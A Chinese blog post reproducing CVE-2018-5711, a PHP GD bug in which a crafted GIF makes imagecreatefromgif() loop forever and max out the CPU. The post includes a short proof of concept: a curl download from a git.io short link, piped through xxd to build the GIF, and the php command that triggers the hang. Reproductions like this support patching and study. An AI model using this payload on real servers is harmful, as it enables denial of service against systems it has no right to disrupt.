# PHP 载入 GIF 图像造成服务器宕机(CVE-2018-5711)的漏洞复现 - 时光不改 - 博客园

> 原文：[`www.cnblogs.com/zhaijiahui/p/8397672.html`](https://www.cnblogs.com/zhaijiahui/p/8397672.html)

参考链接：

[`www.freebuf.com/vuls/161262.html`](http://www.freebuf.com/vuls/161262.html "http://www.freebuf.com/vuls/161262.html")

今日看新漏洞发现一个 UC 编辑部的标题，CVE-2018-5711：一张 GIF 图片就能让服务器宕机的 PHP 漏洞，赶紧点卡看看是啥。

经过了解发现，该漏洞有一定攻击面，攻击方式为 DDoS。

## 漏洞背景：

> 漏洞由台湾 Web 漏洞挖掘大牛 Orange Tsai 发现。
> 
> 漏洞编号：CVE-2018-5711，它能用一张 GIF 图片就可导致服务器发生崩溃直至宕机，在现实中非常容易利用。

## 漏洞影响的 PHP 版本：

> 包含以下 PHP 系列和其它所有 PHP 版本
> 
>     PHP 5 < 5.6.33
> 
>     PHP 7.0 < 7.0.27
> 
>     PHP 7.1 < 7.1.13
> 
>     PHP 7.2 < 7.2.1

## 复现过程：

```
PoC

$ curl -L https://git.io/vN0n4 | xxd -r > poc.gif
$ php -r 'imagecreatefromgif("poc.gif");'
```

根据文章描述进行了复现，发现报错，php 默认是不带 GD 库的

 ![](img/a20dfc95a4dc7c903b8a9f00f1dd4e41.png)

报错内容：

PHP Fatal error:  Uncaught Error: Call to undefined function imagecreatefromgif() in Command line code:1

在 php 中 imagecreate 函数是一个图形处理函数，主要用于新建一个基于调色板的图像了，然后在这个基础上我们可以创建一些图形数字字符之类的，但这个函数需要 GD 库支持，如果没有开启 GD 库使用时会提示 Call to undefined function imagecreate()错误。

可直接安装这个库

```
apt-get install php-gd
```

![](img/31dc809dd62572a5110607e4aa7c95ab.png)

再次执行

```
$ php -r 'imagecreatefromgif("poc.gif");'
```

发现 php 把 cpu 跑满了，确实造成了无限循环

 ![](img/a473717706e0ea592f45357a88ae08e9.png)

最终结果就是，一张 GIF 图片就可以实现无限循环，导致服务器资源耗尽，直到崩溃宕机。